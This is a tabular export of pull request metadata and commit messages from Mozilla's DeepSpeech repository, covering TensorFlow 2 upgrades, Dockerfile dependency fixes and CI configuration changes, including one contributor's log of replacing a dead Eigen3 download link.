116,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3493,3493,Add ogg opus training support,,reuben,477142,2021-01-10T14:18:25Z,MEMBER,True,277,126,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64465cd93a24317242ce53f7ad08cf48481a2ebd,Bump NCCL version due to NVIDIA base image update
117,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3493,3493,Add ogg opus training support,,reuben,477142,2021-01-10T14:18:25Z,MEMBER,True,277,126,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db45057dcc2615888774b9d6eabcedf123a1bd9a,Add missing metadata leak suppressions
118,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3493,3493,Add ogg opus training support,,reuben,477142,2021-01-10T14:18:25Z,MEMBER,True,277,126,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f2e57467c6774f26d525f66cca3ec5953d6c2d33,Compare sample durations with an epsilon
119,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3493,3493,Add ogg opus training support,,reuben,477142,2021-01-10T14:18:25Z,MEMBER,True,277,126,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2feb04763dfbf3d6cd3497fce10bb0c5a046d1b,Fix some test names/descs and drop Py3.5 training tests
120,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3492,3492,Pull in CUDA to the Dockerfile template used for training,"To allow the GPU(s) of the host to be exposed to the Docker container. Without this, the GPUs are not exposed to the Docker container and Docker trains CPU-only. 

From: https://blog.roboflow.com/use-the-gpu-in-docker/

I built a Docker image with these lines, and spawned a container and was able to use `--gpus all` when spawning a container. 
That is, I've tested this change.",KathyReid,114158,2021-01-10T02:47:44Z,COLLABORATOR,False,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dbd07f1e3d9760dfb72f5a887c3e7e5678c25ead,"Pull in CUDA to the Dockerfile template used for training

To allow the GPU(s) of the host to be exposed to the Docker container. Without this, the GPUs are not exposed to the Docker container and Docker trains CPU-only. 

From: https://blog.roboflow.com/use-the-gpu-in-docker/

I built a Docker image with these lines, and spawned a container and was able to use `--gpus all` when spawning a container. 
That is, I've tested this change."
121,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3490,3490,Use a separate task property for getting artifacts of tasks depended on,"This is a convenience change for manually iterating on tasks in the TaskCluster UI. The ""edit task"" UI removes the tasks' dependencies, which means when editing a test task you need to manually reinsert the dependencies every time. This separates the dependency for scheduling purposes from the dependency for downloading artifacts, so that the latter is kept in the ""edit task"" UI and one can just edit the payload as needed to develop/debug/iterate.",reuben,477142,2021-01-08T11:04:35Z,MEMBER,False,45,22,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64e9dd6bb1be6c202a62988003f2b8255f75a4e2,"Use a separate task property for getting artifacts of tasks depended on

This is a convenience change for manually iterating on tasks in the TaskCluster UI.
The ""edit task"" UI removes the tasks' dependencies, which means when editing a test
task you need to manually reinsert the dependencies every time. This separates the
dependency for scheduling purposes from the dependency for downloading artifacts,
so that the latter is kept in the ""edit task"" UI and one can just edit the payload
as needed to develop/debug/iterate."
122,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3489,3489,Added sox dependency in Dockerfile.train,"Added sox in Dockerfile to prevent import `bin/import_cv2.py` from failing inside the container.
The script runs the `soxi` command which is provided by this dependency.",nucklehead,4269264,2021-01-05T06:58:29Z,NONE,False,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,15d7b5030e2507fad4e7d71ebd70d3237198ba5c,"Added sox dependency in Dockerfile.train

Added sox in Dockerfile to prevent import `bin/import_cv2.py` from failing inside the container.
The script runs the `soxi` command which is provided by this dependency."
123,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3488,3488,"Add SoX deps, resolves #3487",,KathyReid,114158,2021-01-04T03:32:39Z,COLLABORATOR,False,9,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac212fe1214c3f9842508d19e986655f71ba4e5d,"Add SoX deps, resolves #3487"
124,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3488,3488,"Add SoX deps, resolves #3487",,KathyReid,114158,2021-01-04T03:32:39Z,COLLABORATOR,False,9,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f30d8a83c69bbcc527d4c6bf65c32d3387941891,Add vim and nano editors to Dockerfile build template
125,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3488,3488,"Add SoX deps, resolves #3487",,KathyReid,114158,2021-01-04T03:32:39Z,COLLABORATOR,False,9,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27b228f2e89b365776ada0f86a727b1c86369450,Add vim and nano editors to the Dockerfile train template
126,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3486,3486,Update refs to 0.9.3 from 0.9.2,"I'm using this documentation to build out a Playbook - please don't interpret this as nitpicking, saw a minor change and made it.",KathyReid,114158,2021-01-03T02:53:54Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb47cf26d09827c60b48b5e15198ee81aeb2aa89,"Update refs to 0.9.3 from 0.9.2

I'm using this documentation to build out a Playbook - please don't interpret this as nitpicking, saw a minor change and made it."
127,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08c2c348f73050876d166925845694814f0cd0cb,Upgrade training code to 2.3.1
128,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85b9f0fd3d831d9789bfa8038510b0433095c6fb,Bump training dependencies to TensorFlow 2.3.1
129,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,159697738c8dbbc71ca3d6aa7c0b7b69c49cab48,Update augmentation code to TF2
130,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b738dd70da9b8d41c78ac8b9921cdd371800825,Update transcribe.py to TF2
131,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,966b9971cf0fbe7affcd2e6930dd2ec9e347d6ba,Remove sequence lenghts input (now using masking)
132,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e963ea249f83b455d3dba486fca91a269638dabc,Update kernel/op dependencies
133,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7802e2f284b4dd0f012d2a66258b9d84970692c3,Fix training test names/descs and drop Py3.5 training tests
134,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,123aeb0a44b3907b5c6cdebecff98cfba50ee2d4,Update training unittests to TF2
135,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21d2ea46b96ea320d6271b9ba80f69346f5fb327,Update Valgrind suppressions for new ops/kernels
136,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7ce98552deff7d3e69bf198e9dc49063c1fd11d,Embed graph version in tensor names
137,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49f327b9f768f966035af6ecacec655b7800ad95,Make sure previous tc-workdir is fresh before starting Darwin tasks
138,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90865fcdea877ca2b4a8c6d3f9867bbe76ae5b74,Update examples and prod model references
139,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3485,3485,Low touch upgrade to TensorFlow 2.3,"Keeps changes to a minimum by leveraging the fact that under a `tfv1.Session` object, TensorFlow v1 style meta-graph construction works normally, including placeholders. This lets us keep changes to a minimum. The main change comes in the model definition code: the previous LSTMBlockCell/static_rnn/CudnnRNN parametrized RNN implementation gets replaced by `tf.keras.layers.LSTM` which is supposed to use the most appropriate implementation given the layer configuration and host machine setup. This is a graph breaking change and so GRAPH_VERSION is bumped.",reuben,477142,2021-01-02T14:33:32Z,MEMBER,False,476,1252,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9587e03e2c4ae52440c107d8665dae9a53f3da84,Fix incorrectly named 8kHz test task
140,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08c2c348f73050876d166925845694814f0cd0cb,Upgrade training code to 2.3.1
141,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85b9f0fd3d831d9789bfa8038510b0433095c6fb,Bump training dependencies to TensorFlow 2.3.1
142,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,159697738c8dbbc71ca3d6aa7c0b7b69c49cab48,Update augmentation code to TF2
143,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b738dd70da9b8d41c78ac8b9921cdd371800825,Update transcribe.py to TF2
144,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,966b9971cf0fbe7affcd2e6930dd2ec9e347d6ba,Remove sequence lenghts input (now using masking)
145,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e963ea249f83b455d3dba486fca91a269638dabc,Update kernel/op dependencies
146,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7802e2f284b4dd0f012d2a66258b9d84970692c3,Fix training test names/descs and drop Py3.5 training tests
147,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,123aeb0a44b3907b5c6cdebecff98cfba50ee2d4,Update training unittests to TF2
148,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21d2ea46b96ea320d6271b9ba80f69346f5fb327,Update Valgrind suppressions for new ops/kernels
149,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7ce98552deff7d3e69bf198e9dc49063c1fd11d,Embed graph version in tensor names
150,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49f327b9f768f966035af6ecacec655b7800ad95,Make sure previous tc-workdir is fresh before starting Darwin tasks
151,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c4a35e39532386ca23ec0b869bd51df4b119997,Update examples and prod model references
152,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3482,3482,Update native client to TensorFlow 2.4,,reuben,477142,2020-12-30T17:31:25Z,MEMBER,False,475,1251,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2411c1c7f31c7a6e87bf90b14dadfdc999d132ca,Update native client to TensorFlow 2.4
153,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3480,3480,Update 404ing link to the eigen3 library - bitbucket to gitlab,"I raised this PR because of an `eigen3` warning received while I was building the training Docker image. 

These are the steps I followed in getting the warning and resolving it. 

## Error while building the DeepSpeech Docker image 

```
-- Could NOT find LibLZMA (missing: LIBLZMA_INCLUDE_DIR LIBLZMA_LIBRARY LIBLZMA_HAS_AUTO_DECODER LIBLZMA_HAS_EASY_ENCODER LIBLZMA_HAS_LZMA_PRESET) 
-- Could NOT find Eigen3 (missing: EIGEN3_INCLUDE_DIR EIGEN3_VERSION_OK) (Required is at least version ""2.91.0"")
CMake Warning at lm/interpolate/CMakeLists.txt:66 (message):
  Not building interpolation.  Eigen3 was not found.


-- To install Eigen3 in your home directory, copy paste this:
export EIGEN3_ROOT=$HOME/eigen-eigen-07105f7124f9
(cd $HOME; wget -O - https://bitbucket.org/eigen/eigen/get/3.2.8.tar.bz2 |tar xj)
rm CMakeCache.txt
```

I attempted the `bash` instructions given, which yielded: 

```
(deepspeech-train-venv) kathyreid@3ai-precision5500:~/deepspeech-train-venv/DeepSpeech$ export EIGEN3_ROOT=$HOME/eigen-eigen-07105f7124f9
(deepspeech-train-venv) kathyreid@3ai-precision5500:~/deepspeech-train-venv/DeepSpeech$ (cd $HOME; wget -O - https://bitbucket.org/eigen/eigen/get/3.2.8.tar.bz2 |tar xj)
--2020-12-30 15:03:24--  https://bitbucket.org/eigen/eigen/get/3.2.8.tar.bz2
Resolving bitbucket.org (bitbucket.org)... 104.192.141.1, 2406:da00:ff00::22c3:9b0a, 2406:da00:ff00::22c5:2ef4, ...
Connecting to bitbucket.org (bitbucket.org)|104.192.141.1|:443... connected.
HTTP request sent, awaiting response... 404 Not Found
2020-12-30 15:03:26 ERROR 404: Not Found.


bzip2: Compressed file ends unexpectedly;
	perhaps it is corrupted?  *Possible* reason follows.
bzip2: Inappropriate ioctl for device
	Input file = (stdin), output file = (stdout)

It is possible that the compressed file(s) have become corrupted.
You can use the -tvv option to test integrity of such files.

You can use the `bzip2recover' program to attempt to recover
data from undamaged sections of corrupted files.

tar: Child returned status 2
tar: Error is not recoverable: exiting now
```

Figured that `eigen3` had moved away from bitbucket to another version control platform, found it on Gitlab. Substituted Gitlab tarball instead as follows: 

```
(deepspeech-train-venv) kathyreid@3ai-precision5500:~$ (cd $HOME; wget -O - https://gitlab.com/libeigen/eigen/-/archive/3.3.8/eigen-3.3.8.tar.bz2 |tar xj)
--2020-12-30 15:45:34--  https://gitlab.com/libeigen/eigen/-/archive/3.3.8/eigen-3.3.8.tar.bz2
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/octet-stream]
Saving to: 'STDOUT’

-                                        [       <=>                                                             ]   1.59M  1.03MB/s    in 1.5s    

2020-12-30 15:45:36 (1.03 MB/s) - written to stdout [1667794]

```

Raising PR in case other folks come across the warning, and then hit a 404. 

Best, Kathy",KathyReid,114158,2020-12-30T05:03:51Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f48985ccf63eb96befd182584228cb771491ca4,"Update 404ing link to the eigen3 library - bitbucket to gitlab

I raised this PR because of an `eigen3` warning received while I was building the training Docker image. 

These are the steps I followed in getting the warning and resolving it. 

## Error while building the DeepSpeech Docker image 

```
-- Could NOT find LibLZMA (missing: LIBLZMA_INCLUDE_DIR LIBLZMA_LIBRARY LIBLZMA_HAS_AUTO_DECODER LIBLZMA_HAS_EASY_ENCODER LIBLZMA_HAS_LZMA_PRESET) 
-- Could NOT find Eigen3 (missing: EIGEN3_INCLUDE_DIR EIGEN3_VERSION_OK) (Required is at least version ""2.91.0"")
CMake Warning at lm/interpolate/CMakeLists.txt:66 (message):
  Not building interpolation.  Eigen3 was not found.


-- To install Eigen3 in your home directory, copy paste this:
export EIGEN3_ROOT=$HOME/eigen-eigen-07105f7124f9
(cd $HOME; wget -O - https://bitbucket.org/eigen/eigen/get/3.2.8.tar.bz2 |tar xj)
rm CMakeCache.txt
```

I attempted the `bash` instructions given, which yielded: 

```
(deepspeech-train-venv) kathyreid@3ai-precision5500:~/deepspeech-train-venv/DeepSpeech$ export EIGEN3_ROOT=$HOME/eigen-eigen-07105f7124f9
(deepspeech-train-venv) kathyreid@3ai-precision5500:~/deepspeech-train-venv/DeepSpeech$ (cd $HOME; wget -O - https://bitbucket.org/eigen/eigen/get/3.2.8.tar.bz2 |tar xj)
--2020-12-30 15:03:24--  https://bitbucket.org/eigen/eigen/get/3.2.8.tar.bz2
Resolving bitbucket.org (bitbucket.org)... 104.192.141.1, 2406:da00:ff00::22c3:9b0a, 2406:da00:ff00::22c5:2ef4, ...
Connecting to bitbucket.org (bitbucket.org)|104.192.141.1|:443... connected.
HTTP request sent, awaiting response... 404 Not Found
2020-12-30 15:03:26 ERROR 404: Not Found.


bzip2: Compressed file ends unexpectedly;
	perhaps it is corrupted?  *Possible* reason follows.
bzip2: Inappropriate ioctl for device
	Input file = (stdin), output file = (stdout)

It is possible that the compressed file(s) have become corrupted.
You can use the -tvv option to test integrity of such files.

You can use the `bzip2recover' program to attempt to recover
data from undamaged sections of corrupted files.

tar: Child returned status 2
tar: Error is not recoverable: exiting now
```

Figured that `eigen3` had moved away from bitbucket to another version control platform, found it on Gitlab. Substituted Gitlab tarball instead as follows: 

```
(deepspeech-train-venv) kathyreid@3ai-precision5500:~$ (cd $HOME; wget -O - https://gitlab.com/libeigen/eigen/-/archive/3.3.8/eigen-3.3.8.tar.bz2 |tar xj)
--2020-12-30 15:45:34--  https://gitlab.com/libeigen/eigen/-/archive/3.3.8/eigen-3.3.8.tar.bz2
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/octet-stream]
Saving to: 'STDOUT’

-                                        [       <=>                                                             ]   1.59M  1.03MB/s    in 1.5s    

2020-12-30 15:45:36 (1.03 MB/s) - written to stdout [1667794]

```

Raising PR in case other folks come across the warning, and then hit a 404. 

Best, Kathy"
154,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3474,3474,Refactor train.py into separate scripts,Currently train.py is overloaded with many independent features. Understanding the code and what will be the result of a training call requires untangling the entire script. It's also an error prone UX. This is a first step at separating independent parts into their own scripts.,reuben,477142,2020-12-18T15:07:59Z,MEMBER,False,581,456,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b85ad3ea743f977d9fe2732e33048a61159fbc48,"Refactor train.py into separate scripts

Currently train.py is overloaded with many independent features.
Understanding the code and what will be the result of a training
call requires untangling the entire script. It's also an error
prone UX. This is a first step at separating independent parts
into their own scripts."
155,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3473,3473,Convert to .taskcluster.yml v1,,reuben,477142,2020-12-17T19:04:17Z,MEMBER,True,103,146,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb1ad0019497492f925c43721a4ccef373b7be66,"Convert to .taskcluster.yml v1

forward TASK_ID, add created and deadline

more fixes

typo

try without TASK_ID

fix task templates

add missing env vars to tc decision dry runs

avoid repetition in .taskcluster and manually forward varibles to tc-decision.py

url -> clone_url

simulate GITHUB_EVENT

separate ref an sha

correct pull request actions

correct pull request policy"
